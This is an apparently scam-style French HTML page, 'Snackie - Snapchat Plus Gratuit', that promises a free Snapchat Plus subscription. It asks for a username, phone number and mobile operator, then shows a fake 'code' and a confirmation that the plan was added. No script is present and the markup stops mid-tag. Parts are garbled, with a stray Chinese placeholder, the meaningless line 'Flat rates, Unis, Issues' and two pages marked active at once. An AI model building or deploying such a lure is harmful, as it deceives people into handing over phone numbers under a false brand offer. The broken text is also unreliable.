<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snackie - Snapchat Plus Gratuit</title>
    <style>
        /* --- DESIGN DU SITE (CSS) --- */
        body {
            margin: 0;
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #FFD500 0%, #00A3FF 100%); /* Le mix Or/Snap Snapchat */
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card {
            background: white;
            width: 90%;
            max-width: 380px;
            border-radius: 25px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            text-align: center;
            position: relative;
            overflow: hidden;
            transition: all 0.4s ease;
        }

        h2 {
            margin: 0;
            color: #333;
            font-weight: 800;
            letter-spacing: -0.5px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
            width: 100%;
        }

        label {
            display: block;
            font-size: 12px;
            color: #888;
            margin-bottom: 5px;
            margin-left: 5px;
            font-weight: bold;
        }

        input, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #eee;
            border-radius: 12px;
            font-size: 16px;
            box-sizing: border-box; /* Important pour pas que ça dépasse */
            outline: none;
            transition: 0.3s;
        }

        input:focus, select:focus {
            border-color: #00A3FF;
        }

        /* Le bouton "Jackpot" */
        .btn-jackpot {
            background: linear-gradient(to right, #00C6FF, #0072FF);
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 5px 15px rgba(0,114,255,0.3);
            transition: transform 0.2s;
        }

        .btn-jackpot:active {
            transform: scale(0.98);
        }

        /* --- GESTION DES PAGES (Hidden classes) --- */
        .page {
            display: none; /* Caché par défaut */
            animation: slideUp 0.5s ease;
        }

        .active {
            display: block; /* Affiché si actif */
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* --- DÉTAILS SPÉCIFIQUES --- */
        /* Page 2 : Le code magique */
        .magic-code {
            background-color: #f0f8ff;
            border: 2px dashed #00A3FF;
            font-size: 32px;
            font-weight: bold;
            color: #00A3FF;
            padding: 15px;
            margin: 20px 0;
            border-radius: 10px;
            letter-spacing: 5px;
        }

        /* Page 3 : La "Lettre d'expédition" */
        .letter-bg {
            /* Effet papier */
            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 100 L100 0' stroke='%23eee' stroke-width='0.5' opacity='0.5'/%3E%3C/svg%3E");
        }
        
        /* Un petit pointeur flèche (Simulé en CSS pur) */
        .check-mark {
            width: 60px;
            height: 60px;
            background: #43B584;
            border-radius: 50%;
            color: white;
            font-size: 30px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 20px rgba(67, 181, 132, 0.4);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

    </style>
</head>
<body>

    <div class="card">
        
        <!-- PAGE 1 : LE FORMULAIRE -->
        <div id="page-1" class="page active">
            <div class="input-group">
                <label>Nom d'utilisateur</label>
                <input type="text" id="username" placeholder="Ex:吃饭_thon" value="Lucky_13">
                
                <label>Numéro de téléphone</label>
                <input type="tel" icon="06" placeholder="06 12 34 56 78">
                
                <label>Opérateur</label>
                <select id="operator">
                    <option value="orange">Orange</option>
                    <option value="sfr">SFR</option>
                    <option value="bouygues">Bouygues Telecom</option>
                </select>
            </div>
            
            <button class="btn-jackpot" onclick="goToPage('page-2')">
                C'est bon 2450
            </button>
        </div>


        <!-- PAGE 2 : LE CODE D'AUTHENTIFICATION -->
        <div id="page-2" class="page">
            <h2>Identifiant trouvé</h2>
            <p style="color:#666; font-size:14px; margin-bottom:5px;">Votre code Snapchat Plus est :</p>
            
            <div class="magic-code">2450</div>
            
            <button class="btn-jackpot" onclick="goToPage('page-3')">
                Valider le Code
            </button>
        </div>


        <!-- PAGE 3 : LA PÉRIODE D'ESPÉRANCE -->
        <div id="page-3" class="page active">
            <!-- Petit décor papier -->
            <div class="letter-bg">
            
                <div class="input-group" style="margin-bottom:10px;">
                    <div class="check-mark">✓</div>
                    <label style="color:#333; margin-left:10px;">Commandé</label>
                </div>

                <h2>L'abonnement viendra...</h2>
                
                <p style="font-size:16px; color:#555; line-height:1.6;">
                    <span style="font-size:14px; font-weight:bold; color:#00A3FF;">Votre forfait</span> 
                    vient d'être ajouté.
                </p>

                <p style="font-size:14px; color:#888; margin-top:-10px; margin-bottom:25px;">
                    Flat rates, Unis, Issues
                </p>

                <button class="btn-jackpot
